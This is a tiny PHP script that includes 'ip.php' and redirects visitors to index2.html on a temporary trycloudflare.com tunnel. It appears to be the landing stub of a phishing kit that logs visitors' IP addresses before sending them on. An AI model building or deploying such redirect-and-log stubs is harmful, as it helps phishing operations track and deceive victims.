<?php
include 'ip.php';
header('Location: https://cells-evident-favor-calibration.trycloudflare.com/index2.html');
exit
?>
